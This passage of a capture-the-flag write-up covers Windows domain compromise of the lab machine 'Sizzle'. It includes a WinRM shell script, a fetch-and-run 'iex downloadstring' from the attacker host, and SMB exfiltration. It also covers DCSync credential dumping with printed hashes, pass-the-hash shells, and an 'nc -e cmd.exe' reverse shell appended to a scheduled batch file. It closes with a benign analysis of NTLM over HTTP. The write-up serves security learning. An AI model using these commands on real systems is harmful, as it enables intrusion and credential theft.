Started: Thu Jan 31 06:52:43 2019
Stopped: Thu Jan 31 06:52:54 2019

```

Now I have a password for mrlky, “Football#7”.

### WinRM Shell as mrlky

I’ll do the same process again for mrlky that I had done for amanda and create a certificate.

```

root@kali# openssl pkcs12 -in mrlky.p12 -nocerts -out mrlky.key        
Enter Import Password:                                    
Enter PEM pass phrase:                                                            
Verifying - Enter PEM pass phrase:                                  
root@kali# openssl pkcs12 -in mrlky.p12 -clcerts -nokeys -out mrlky.crt
Enter Import Password:

```

Then I’ll make another copy of `winrm_shell.rb` and get a shell as mrlky:

```

root@kali# cat winrm_shell-mrlky.rb
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new(
  endpoint: 'https://10.10.10.103:5986/wsman',
  transport: :ssl,
  client_cert: 'mrlky.crt',
  client_key: 'mrlky.key',
  key_pass: '0xdf',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end

```

```

root@kali# ruby winrm_shell-mrlky.rb
PS htb\mrlky@SIZZLE Documents>

```

From here I can grab `user.txt`:

```

PS htb\mrlky@SIZZLE desktop> dir

    Directory: C:\Users\mrlky\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/10/2018   6:24 PM             32 user.txt

PS htb\mrlky@SIZZLE desktop> type user.txt
a6ca1f8e...

```

## Privesc: mrlky –> administrator

### BloodHound

I’ll run [bloodhound](https://github.com/BloodHoundAD/BloodHound) to understand what permissions are available to me and other users one this host. Upload and run it:

```

PS C:\users\amanda\appdata\local\temp> iex(new-object net.webclient).downloadstring('http://10.10.14.4/SharpHound.ps1')
PS C:\users\amanda\appdata\local\temp> invoke-bloodhound -collectionmethod all
PS C:\users\amanda\appdata\local\temp> ls

    Directory: C:\users\amanda\appdata\local\temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/10/2018   4:58 PM                Low
-a----        1/31/2019  12:15 PM           7284 20190131121540_BloodHound.zip
-a----        1/31/2019   9:46 AM           7761 a.csproj
-a----        1/31/2019   6:03 AM          34816 a.exe
-a----        1/31/2019  10:54 AM          10752 Amsi.dll
-a----        1/31/2019   9:33 AM           7680 b.exe
-a----        1/31/2019  12:15 PM           5911 BloodHound.bin
-a----        1/31/2019  10:48 AM        7613952 c.exe
-a----        1/31/2019  12:14 PM         882999 s.ps1
-a----        7/11/2018   1:59 PM            495 StructuredQuery.log
-a----        7/10/2018   4:58 PM            687 wmsetup.log
-a----        1/31/2019  10:53 AM          34816 z.exe

```

To get the output off, I’ll use `smbserver.py`. Sizzle won’t connect to an unauthenticated share:

```

PS htb\amanda@SIZZLE Documents> net use \\10.10.14.4\share
net.exe : System error 58 has occurred.
    + CategoryInfo          : NotSpecified: (System error 58 has occurred.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

The specified server cannot perform the requested operation.

```

But, if I run `smbserver.py` with the `-username` and `-password` options, it works fine:

```

root@kali# smbserver.py -smb2support share . -username df -password df                                                                                                       
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Now connect to the share:

```

PS htb\amanda@SIZZLE Documents> net use \\10.10.14.4\share /u:df df
The command completed successfully.

```

And now I can exfil:

```

PS htb\amanda@SIZZLE temp> copy 20190131121540_BloodHound.zip \\10.10.14.4\share\

```

I’ll open bloodhound on my local machine (see [my Reel writeup](/2018/11/10/htb-reel.html#bloodhound) for background and details on getting it set up), upload the zip, and start with mrlky and look at node info. Outbound object control shows 1, and clicking that one brings the domain onto the screen with `GetChanges` and `GetChangesAll` privileges:

![1548959109386](https://0xdfimages.gitlab.io/img/1548959109386.png)

### DCSync

This means I’m in position to do a dcsync attack. The idea is that I will replicate the DC account password data as if I were another DC. For more details, check out [this post from yojimbosecurity](https://yojimbosecurity.ninja/dcsync/) or [this from adsecurity](https://adsecurity.org/?p=1729).

I can run the attack with `secretsdump.py` from my host without any port forwarding:

```

root@kali# secretsdump.py -just-dc mrlky:Football#7@10.10.10.103
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation            

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:a571008b8559fc7e6abb364efa15312c:::
[*] Kerberos keys grabbed                                                   
Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
Administrator:des-cbc-md5:ad7afb706715e964                                   
krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
krbtgt:des-cbc-md5:866db35eb9ec5173
amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
amanda:des-cbc-md5:70ba677a4c1a2adf
mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
mrlky:des-cbc-md5:02f1a4da0432f7f7
sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
sizzler:des-cbc-md5:5d51d30e68d092d9
SIZZLE$:aes256-cts-hmac-sha1-96:037a6a1bb47867be060491ddc54ff4bdf8057e1713dc3e2dd9a88cd5305384f4
SIZZLE$:aes128-cts-hmac-sha1-96:f7e839c51376067067d425a3baba2693
SIZZLE$:des-cbc-md5:3210b6852a4a2ae9
[*] Cleaning up...  

```

### Shell

Now get a shell with pass the hash. I can check that hash using `crackmapexec`:

```

root@kali:/opt/impacket# crackmapexec 10.10.10.103 -u administrator -H f6b7160bfc91823792e0ac3a162c9267
CME          10.10.10.103:445 SIZZLE          [*] Windows 10.0 Build 14393 (name:SIZZLE) (domain:HTB)
CME          10.10.10.103:445 SIZZLE          [+] HTB\administrator f6b7160bfc91823792e0ac3a162c9267 (Pwn3d!)
[*] KTHXBYE!

```

I’ll get a shell with `wmiexec.py`:

```

root@kali:/opt/impacket# wmiexec.py -hashes :f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator

```

From there, I can get the flag:

```

C:\users\administrator\desktop>type root.txt                        
91c58493...

```

## Beyond Root - Unintended Paths

Sizzle has two unintended paths that I know of, that allow you to skip a lot of the host. Here’s a diagram of the general steps of Sizzle, with the two unintended paths shown:

![](https://0xdfimages.gitlab.io/img/sizzle.png)

### Unintended Path #1 - clean.bat

The permissions in the administrator’s home directory are such that I can’t read at the root, but I can read in known folders:

```

PS htb\amanda@SIZZLE administrator> ls
Access to the path 'C:\users\administrator' is denied.
At line:1 char:1
+ ls
+ ~~
    + CategoryInfo          : PermissionDenied: (C:\users\administrator:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
PS htb\amanda@SIZZLE administrator> cd desktop
PS htb\amanda@SIZZLE desktop> ls

    Directory: C:\users\administrator\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/10/2018   6:24 PM             32 root.txt

```

Now I can’t read `root.txt`, but I can look around in other known folders, like `documents`:

```

PS htb\amanda@SIZZLE documents> ls

    Directory: C:\users\administrator\documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/10/2018   6:11 PM             79 clean.bat 

```

It makes sense that there’s a script to clean up things, since I saw files being deleted from the SMB share at the start of the box. I can read the file:

```

PS htb\amanda@SIZZLE documents> type clean.bat
forfiles -p "C:\Department Shares\Users\Public" -s -m *.* /C "cmd /c del @path"

```

It turns out amanda has full control over this file:

```

PS htb\amanda@SIZZLE documents> icacls clean.bat
clean.bat NT AUTHORITY\SYSTEM:(I)(F)
          BUILTIN\Administrators:(I)(F)
          HTB\Administrator:(I)(F)
          HTB\amanda:(I)(F)

```

So I’ll upload `nc` to the host, and add a call to `nc` to the bat file:

```

PS htb\amanda@SIZZLE documents> echo "" | out-file -encoding ASCII -append clean.bat
PS htb\amanda@SIZZLE documents> echo '\windows\system32\spool\drivers\color\n.exe -e cmd.exe 10.10.14.4 443' | out-file -encoding ASCII -append test.bat
PS htb\amanda@SIZZLE documents> type clean.bat
forfiles -p "C:\Department Shares\Users\Public" -s -m *.* /C "cmd /c del @path"  
c:\windows\system32\spool\drivers\color\n.exe -e cmd.exe 10.10.14.4 443  

```

When the job runs, I get an administrator shell:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.103.
Ncat: Connection from 10.10.10.103:65340.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
htb\administrator

```

### Unintended Path #2 - Hashes

There’s an unusual file in `\Windows\System32`:

```

PS htb\amanda@SIZZLE system32> ls *.txt

    Directory: C:\windows\system32

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/11/2018  11:15 PM            996 file.txt
-a----        7/16/2016   9:20 AM           1649 WindowsCodecsRaw.txt    

```

The file contains hashes:

```

PS htb\amanda@SIZZLE system32> type file.txt
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::

Domain    User  ID  Hash
------    ----  --  ----
HTB.LOCAL Guest 501 -   
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrb3n:1105:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::

```

The hash for Administrator doesn’t seem to work, but mrlky’s doesn’t. This means I can skip Kerberoasting mrlky and just use hash to run my DCSync attack:

```

root@kali# secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef -just-dc HTB.LOCAL/mrlky@10.10.10.103
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...[snip]...

```

## Beyond Root - NTLM Auth

### Overview

I lost a lot of time thinking that amanda’s creds didn’t work with the `/certsrv` page because I was running through `burp`, which is my default position. When I finally gave up and asked for help as to where to go next, someone hinted me at that page, and only after a few minutes of our both logging into the same box with his working and mine not did we figure out the only different was that I had `burp` on. I tweeted about this back in January:

> Hopefully this tweet may save you hours that I lost - older versions of burp will break some NTLM authentication. So if you think you have good creds but they don't work, try turning off burp or updating!<https://t.co/Kdf3NqWhAF>
>
> — 0xdf (@0xdf\_) [January 28, 2019](https://twitter.com/0xdf_/status/1089991747621568520?ref_src=twsrc%5Etfw)

I wanted to figure out what was going on. That required two things:
- An understanding of how NTLM authentication over HTTP works;
- Figuring out what is different when running through Burp.

### NTLM HTTP Auth

[This](https://www.innovation.ch/personal/ronald/ntlm.html) is a great page for understanding the details of NTLM authentication. For more details, it’s a good read. But here’s the basics. NTLM authentication over HTTP takes place over a series of steps (the site above calls it a 4-way handshake, but there are more than 4 steps). This is at layer 7, after the TCP 3-way handshake is already complete. The messages binary, sent in base64.

The diagram from [innovation.ch](https://www.innovation.ch/personal/ronald/ntlm.html) shows the steps nicely:

```

    1: C  --> S   GET ...
    
    2: C <--  S   401 Unauthorized
                  WWW-Authenticate: NTLM
    
    3: C  --> S   GET ...
                  Authorization: NTLM <base64-encoded type-1-message>
    
    4: C <--  S   401 Unauthorized
                  WWW-Authenticate: NTLM <base64-encoded type-2-message>
    
    5: C  --> S   GET ...
                  Authorization: NTLM <base64-encoded type-3-message>
    
    6: C <--  S   200 Ok

```

So the client issues a GET request, and the server responds 401, with a header saying to auth over NTLM. The client sends another GET with the type-1 message, which can contain information about the client. The server responds 401 again, this time with a message including some info about itself, and a nonce (8 random bytes). The client uses the password hash to encrypt the nonce and sends it back. If the server verifies that it can decrypt the nonce using that user’s hash (either itself if it is the DC, or by sending it to the DC for verification), then it sends back a 200 OK and continues with the page.

### Without Burp

So what is happening with `burp`? It is fortunate that Sizzle allows all of this over HTTP, so I don’t have to bother with SSL key logging to see the traffic in Wireshark. I’ll connect twice, once through `burp` and once without, and see what’s different.

The first time I log in I’m going without `burp`. I visit the site, enter amanda’s creds, and I’m logged in. In Wireshark, I see two TCP streams. The first stream, I see a GET request from Firefox, with a 401 return. The 401 respond has two headers, `WWW-Authenticate: Negotiate` and `WWW-Authenticate: NTLM`:

![1558731669250](https://0xdfimages.gitlab.io/img/1558731669250.png)

I can see the TCP connection close down at the end of the request.

The second stream starts with a new TCP handshake. Then the type 1 message from the client, then the type two message from the server. In the same TCP stream, the client responds again with the type three message:

```

GET /certsrv/ HTTP/1.1
Host: sizzle.htb.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Authorization: NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=

HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
WWW-Authenticate: NTLM TlRMTVNTUAACAAAABgAGADgAAAAFgokCuzldAQELDG0AAAAAAAAAAHoAegA+AAAACgA5OAAAAA9IAFQAQgACAAYASABUAEIAAQAMAFMASQBaAFoATABFAAQAEgBIAFQAQgAuAEwATwBDAEEATAADACAAcwBpAHoAegBsAGUALgBIAFQAQgAuAEwATwBDAEEATAAFABIASABUAEIALgBMAE8AQwBBAEwABwAIAI2CbQJyEtUBAAAAAA==
Date: Fri, 24 May 2019 20:48:15 GMT
Content-Length: 341

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Not Authorized</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Not Authorized</h2>
<hr><p>HTTP Error 401. The requested resource requires user authentication.</p>
</BODY></HTML>
GET /certsrv/ HTTP/1.1
Host: sizzle.htb.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Authorization: NTLM TlRMTVNTUAADAAAAGAAYAGIAAACmAKYAegAAAAAAAABAAAAADAAMAEAAAAAWABYATAAAAAAAAAAAAAAABYIIAGEAbQBhAG4AZABhAFcATwBSAEsAUwBUAEEAVABJAE8ATgCOu6RkK3YS7HSjleVmKAVolKVE+CezuYRtJ4sHDazUNlA5MuskRgg9AQEAAAAAAAAAlXiBcxLVARgyT9XdyeXRAAAAAAIABgBIAFQAQgABAAwAUwBJAFoAWgBMAEUABAASAEgAVABCAC4ATABPAEMAQQBMAAMAIABzAGkAegB6AGwAZQAuAEgAVABCAC4ATABPAEMAQQBMAAUAEgBIAFQAQgAuAEwATwBDAEEATAAHAAgAjYJtAnIS1QEAAAAA

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/10.0
Set-Cookie: ASPSESSIONIDAATADTDC=DBCHAKCAMGKOPCGPNNJBDCLH; path=/
Persistent-Auth: true
X-Powered-By: ASP.NET
Date: Fri, 24 May 2019 20:48:15 GMT
Content-Length: 3682

...[snip]...

```

I can actually look at these messages and see the info in them. Type-1 is basically empty, since my host doesn’t have domain information:

```

root@kali# echo TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= | base64 -d | xxd
00000000: 4e54 4c4d 5353 5000 0100 0000 0782 0800  NTLMSSP.........
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................

```

In the type-2 message, there’s a nonce as well as info about the server:

```

root@kali# echo TlRMTVNTUAACAAAABgAGADgAAAAFgokCuzldAQELDG0AAAAAAAAAAHoAegA+AAAACgA5OAAAAA9IAFQAQgACAAYASABUAEIAAQAMAFMASQBaAFoATABFAAQAEgBIAFQAQgAuAEwATwBDAEEATAADACAAcwBpAHoAegBsAGUALgBIAFQAQgAuAEwATwBDAEEATAAFABIASABUAEIALgBMAE8AQwBBAEwABwAIAI2CbQJyEtUBAAAAAA== | base64 -d | xxd
00000000: 4e54 4c4d 5353 5000 0200 0000 0600 0600  NTLMSSP.........
00000010: 3800 0000 0582 8902 bb39 5d01 010b 0c6d  8........9]....m
00000020: 0000 0000 0000 0000 7a00 7a00 3e00 0000  ........z.z.>...
00000030: 0a00 3938 0000 000f 4800 5400 4200 0200  ..98....H.T.B...
00000040: 0600 4800 5400 4200 0100 0c00 5300 4900  ..H.T.B.....S.I.
00000050: 5a00 5a00 4c00 4500 0400 1200 4800 5400  Z.Z.L.E.....H.T.
00000060: 4200 2e00 4c00 4f00 4300 4100 4c00 0300  B...L.O.C.A.L...
00000070: 2000 7300 6900 7a00 7a00 6c00 6500 2e00   .s.i.z.z.l.e...
00000080: 4800 5400 4200 2e00 4c00 4f00 4300 4100  H.T.B...L.O.C.A.
00000090: 4c00 0500 1200 4800 5400 4200 2e00 4c00  L.....H.T.B...L.
000000a0: 4f00 4300 4100 4c00 0700 0800 8d82 6d02  O.C.A.L.......m.
000000b0: 7212 d501 0000 0000                      r.......

```

The type-3 message has the username and the signed nonce:

```

root@kali# echo TlRMTVNTUAADAAAAGAAYAGIAAACmAKYAegAAAAAAAABAAAAADAAMAEAAAAAWABYATAAAAAAAAAAAAAAABYIIAGEAbQBhAG4AZABhAFcATwBSAEsAUwBUAEEAVABJAE8ATgCOu6RkK3YS7HSjleVmKAVolKVE+CezuYRtJ4sHDazUNlA5MuskRgg9AQEAAAAAAAAAlXiBcxLVARgyT9XdyeXRAAAAAAIABgBIAFQAQgABAAwAUwBJAFoAWgBMAEUABAASAEgAVABCAC4ATABPAEMAQQBMAAMAIABzAGkAegB6AGwAZQAuAEgAVABCAC4ATABPAEMAQQBMAAUAEgBIAFQAQgAuAEwATwBDAEEATAAHAAgAjYJtAnIS1QEAAAAA | base64 -d | xxd
00000000: 4e54 4c4d 5353 5000 0300 0000 1800 1800  NTLMSSP.........
00000010: 6200 0000 a600 a600 7a00 0000 0000 0000  b.......z.......
00000020: 4000 0000 0c00 0c00 4000 0000 1600 1600  @.......@.......
00000030: 4c00 0000 0000 0000 0000 0000 0582 0800  L...............
00000040: 6100 6d00 6100 6e00 6400 6100 5700 4f00  a.m.a.n.d.a.W.O.
00000050: 5200 4b00 5300 5400 4100 5400 4900 4f00  R.K.S.T.A.T.I.O.
00000060: 4e00 8ebb a464 2b76 12ec 74a3 95e5 6628  N....d+v..t...f(
00000070: 0568 94a5 44f8 27b3 b984 6d27 8b07 0dac  .h..D.'...m'....
00000080: d436 5039 32eb 2446 083d 0101 0000 0000  .6P92.$F.=......
00000090: 0000 0095 7881 7312 d501 1832 4fd5 ddc9  ....x.s....2O...
000000a0: e5d1 0000 0000 0200 0600 4800 5400 4200  ..........H.T.B.
000000b0: 0100 0c00 5300 4900 5a00 5a00 4c00 4500  ....S.I.Z.Z.L.E.
000000c0: 0400 1200 4800 5400 4200 2e00 4c00 4f00  ....H.T.B...L.O.
000000d0: 4300 4100 4c00 0300 2000 7300 6900 7a00  C.A.L... .s.i.z.
000000e0: 7a00 6c00 6500 2e00 4800 5400 4200 2e00  z.l.e...H.T.B...
000000f0: 4c00 4f00 4300 4100 4c00 0500 1200 4800  L.O.C.A.L.....H.
00000100: 5400 4200 2e00 4c00 4f00 4300 4100 4c00  T.B...L.O.C.A.L.
00000110: 0700 0800 8d82 6d02 7212 d501 0000 0000  ......m.r.......

```

And then the server responds with 200 and the page.

### With Burp

So I clear my cookies, restart Firefox and Wireshark, and run do it again, this time with `burp` enabled.

Right away, I notice that there’s more streams, four. Stream zero looks exactly the same as the previous test. Stream one starts just like the second stream above, but ends after the server sends the 401 with the type-2 message:

![1558732205986](https://0xdfimages.gitlab.io/img/1558732205986.png)

I can see the FIN/ACK, ACK at the end closing the TCP connection.

The next TCP connection starts with a GET request with the type-3 message. But this time, the server returns 401.

It seems that `burp` causes a new TCP connection to start between the first two messages and the third message in the NTLM auth. There’s a paragraph on the [innovation.ch](https://www.innovation.ch/personal/ronald/ntlm.html) page that explicitly states this is a problem:

> Keeping the connection alive
>
> As mentioned above, this scheme authenticates *connections*, not requests. This manifests itself in that the network connection must be kept alive during the second part of the handshake, i.e. between the receiving of the type-2 message from the server (step 4) and the sending of the type-3 message (step 5). Each time the connection is closed this second part (steps 3 through 6) must be repeated over the new connection (i.e. it’s not enough to just keep sending the last type-3 message). Also, once the connection is authenticated, the Authorization header need not be sent anymore while the connection stays open, no matter what resource is accessed.

Mystery solved.